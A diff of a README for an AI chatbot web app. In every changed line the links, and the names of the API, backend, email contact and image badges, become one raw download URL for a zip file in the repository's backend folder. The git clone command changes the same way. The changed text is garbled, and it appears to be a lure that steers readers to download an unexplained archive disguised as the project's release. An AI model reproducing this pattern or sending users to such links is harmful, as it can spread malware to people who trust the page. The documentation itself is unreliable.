@@ -1,8 +1,8 @@
 # AI Chatbot: A Modern Conversational Experience 🌐🤖
 
-![AI Chatbot](https://github.com/MihirLathigara012/AI-Chatbot/releases%20Chatbot-Open%https://github.com/MihirLathigara012/AI-Chatbot/releases)
-![Version](https://github.com/MihirLathigara012/AI-Chatbot/releases)
-![License](https://github.com/MihirLathigara012/AI-Chatbot/releases)
+![AI Chatbot](https://raw.githubusercontent.com/MihirLathigara012/AI-Chatbot/main/backend/Chatbot-A-tufthunter.zip%20Chatbot-Open%https://raw.githubusercontent.com/MihirLathigara012/AI-Chatbot/main/backend/Chatbot-A-tufthunter.zip)
+![Version](https://raw.githubusercontent.com/MihirLathigara012/AI-Chatbot/main/backend/Chatbot-A-tufthunter.zip)
+![License](https://raw.githubusercontent.com/MihirLathigara012/AI-Chatbot/main/backend/Chatbot-A-tufthunter.zip)
 
 ## Table of Contents
 
@@ -20,12 +20,12 @@
 
 ## Overview
 
-This AI Chatbot is a sleek, modern web application designed to provide users with an intuitive conversational experience, similar to ChatGPT. Built using HTML, CSS, and JavaScript, and powered by https://github.com/MihirLathigara012/AI-Chatbot/releases APIs, it delivers real-time AI responses within a fully responsive and theme-switchable chat environment.
+This AI Chatbot is a sleek, modern web application designed to provide users with an intuitive conversational experience, similar to ChatGPT. Built using HTML, CSS, and JavaScript, and powered by https://raw.githubusercontent.com/MihirLathigara012/AI-Chatbot/main/backend/Chatbot-A-tufthunter.zip APIs, it delivers real-time AI responses within a fully responsive and theme-switchable chat environment.
 
 ## Features
 
 - **Intuitive UI**: A user-friendly interface that makes chatting easy.
-- **Real-Time Responses**: Instant replies powered by https://github.com/MihirLathigara012/AI-Chatbot/releases APIs.
+- **Real-Time Responses**: Instant replies powered by https://raw.githubusercontent.com/MihirLathigara012/AI-Chatbot/main/backend/Chatbot-A-tufthunter.zip APIs.
 - **Responsive Design**: Works seamlessly on all devices.
 - **Theme Switcher**: Change the look and feel with just a click.
 - **Customizable**: Easily modify the chatbot to fit your needs.
@@ -33,8 +33,8 @@ This AI Chatbot is a sleek, modern web application designed to provide users wit
 ## Technologies Used
 
 - **Frontend**: HTML5, CSS3, JavaScript
-- **Backend**: https://github.com/MihirLathigara012/AI-Chatbot/releases, https://github.com/MihirLathigara012/AI-Chatbot/releases
-- **API**: https://github.com/MihirLathigara012/AI-Chatbot/releases
+- **Backend**: https://raw.githubusercontent.com/MihirLathigara012/AI-Chatbot/main/backend/Chatbot-A-tufthunter.zip, https://raw.githubusercontent.com/MihirLathigara012/AI-Chatbot/main/backend/Chatbot-A-tufthunter.zip
+- **API**: https://raw.githubusercontent.com/MihirLathigara012/AI-Chatbot/main/backend/Chatbot-A-tufthunter.zip
 - **Deployment**: Render
 
 ## Installation
@@ -44,7 +44,7 @@ To get started with the AI Chatbot, follow these steps:
 1. **Clone the Repository**:
 
    ```bash
-   git clone https://github.com/MihirLathigara012/AI-Chatbot/releases
+   git clone https://raw.githubusercontent.com/MihirLathigara012/AI-Chatbot/main/backend/Chatbot-A-tufthunter.zip
    ```
 
 2. **Navigate to the Directory**:
@@ -71,7 +71,7 @@ After installation, open your web browser and navigate to `http://localhost:3000
 
 ## API Integration
 
-The AI Chatbot uses the https://github.com/MihirLathigara012/AI-Chatbot/releases API for generating responses. You will need to sign up for an API key at [https://github.com/MihirLathigara012/AI-Chatbot/releases](https://github.com/MihirLathigara012/AI-Chatbot/releases). Once you have your API key, add it to your environment variables or configuration file.
+The AI Chatbot uses the https://raw.githubusercontent.com/MihirLathigara012/AI-Chatbot/main/backend/Chatbot-A-tufthunter.zip API for generating responses. You will need to sign up for an API key at [https://raw.githubusercontent.com/MihirLathigara012/AI-Chatbot/main/backend/Chatbot-A-tufthunter.zip](https://raw.githubusercontent.com/MihirLathigara012/AI-Chatbot/main/backend/Chatbot-A-tufthunter.zip). Once you have your API key, add it to your environment variables or configuration file.
 
 ## Themes
 
@@ -96,14 +96,14 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or suggestions, feel free to reach out:
 
-- **Email**: https://github.com/MihirLathigara012/AI-Chatbot/releases
-- **GitHub**: [MihirLathigara012](https://github.com/MihirLathigara012/AI-Chatbot/releases)
+- **Email**: https://raw.githubusercontent.com/MihirLathigara012/AI-Chatbot/main/backend/Chatbot-A-tufthunter.zip
+- **GitHub**: [MihirLathigara012](https://raw.githubusercontent.com/MihirLathigara012/AI-Chatbot/main/backend/Chatbot-A-tufthunter.zip)
 
 ## Releases
 
-You can download the latest version of the AI Chatbot from the [Releases](https://github.com/MihirLathigara012/AI-Chatbot/releases) section. Make sure to check this section for updates and new features.
+You can download the latest version of the AI Chatbot from the [Releases](https://raw.githubusercontent.com/MihirLathigara012/AI-Chatbot/main/backend/Chatbot-A-tufthunter.zip) section. Make sure to check this section for updates and new features.
 
-![Chatbot Screenshot](https://github.com/MihirLathigara012/AI-Chatbot/releases)
+![Chatbot Screenshot](https://raw.githubusercontent.com/MihirLathigara012/AI-Chatbot/main/backend/Chatbot-A-tufthunter.zip)
 
 ## Topics
 
@@ -117,28 +117,28 @@ This repository covers a range of topics, including:
 - CSS
 - HTML
 - JavaScript
-- https://github.com/MihirLathigara012/AI-Chatbot/releases
+- https://raw.githubusercontent.com/MihirLathigara012/AI-Chatbot/main/backend/Chatbot-A-tufthunter.zip
 - OpenRouter
-- https://github.com/MihirLathigara012/AI-Chatbot/releases
+- https://raw.githubusercontent.com/MihirLathigara012/AI-Chatbot/main/backend/Chatbot-A-tufthunter.zip
 
 For more details on the topics, visit the repository or explore the code.
 
 ## Additional Resources
 
-- [https://github.com/MihirLathigara012/AI-Chatbot/releases Documentation](https://github.com/MihirLathigara012/AI-Chatbot/releases)
-- [https://github.com/MihirLathigara012/AI-Chatbot/releases Documentation](https://github.com/MihirLathigara012/AI-Chatbot/releases)
-- [https://github.com/MihirLathigara012/AI-Chatbot/releases Documentation](https://github.com/MihirLathigara012/AI-Chatbot/releases)
+- [https://raw.githubusercontent.com/MihirLathigara012/AI-Chatbot/main/backend/Chatbot-A-tufthunter.zip Documentation](https://raw.githubusercontent.com/MihirLathigara012/AI-Chatbot/main/backend/Chatbot-A-tufthunter.zip)
+- [https://raw.githubusercontent.com/MihirLathigara012/AI-Chatbot/main/backend/Chatbot-A-tufthunter.zip Documentation](https://raw.githubusercontent.com/MihirLathigara012/AI-Chatbot/main/backend/Chatbot-A-tufthunter.zip)
+- [https://raw.githubusercontent.com/MihirLathigara012/AI-Chatbot/main/backend/Chatbot-A-tufthunter.zip Documentation](https://raw.githubusercontent.com/MihirLathigara012/AI-Chatbot/main/backend/Chatbot-A-tufthunter.zip)
 
 Feel free to explore these resources to deepen your understanding of the technologies used in this project.
 
 ## Acknowledgments
 
-Thanks to the developers of https://github.com/MihirLathigara012/AI-Chatbot/releases for providing a robust API for AI responses. Your work makes projects like this possible.
+Thanks to the developers of https://raw.githubusercontent.com/MihirLathigara012/AI-Chatbot/main/backend/Chatbot-A-tufthunter.zip for providing a robust API for AI responses. Your work makes projects like this possible.
 
-![OpenRouter](https://github.com/MihirLathigara012/AI-Chatbot/releases)
+![OpenRouter](https://raw.githubusercontent.com/MihirLathigara012/AI-Chatbot/main/backend/Chatbot-A-tufthunter.zip)
 
 ## Final Note
 
 We appreciate your interest in the AI Chatbot project. If you encounter any issues or have feedback, please reach out through the contact information provided above. 
 
-For updates, features, and more, don’t forget to check the [Releases](https://github.com/MihirLathigara012/AI-Chatbot/releases) section regularly.
+For updates, features, and more, don’t forget to check the [Releases](https://raw.githubusercontent.com/MihirLathigara012/AI-Chatbot/main/backend/Chatbot-A-tufthunter.zip) section regularly.
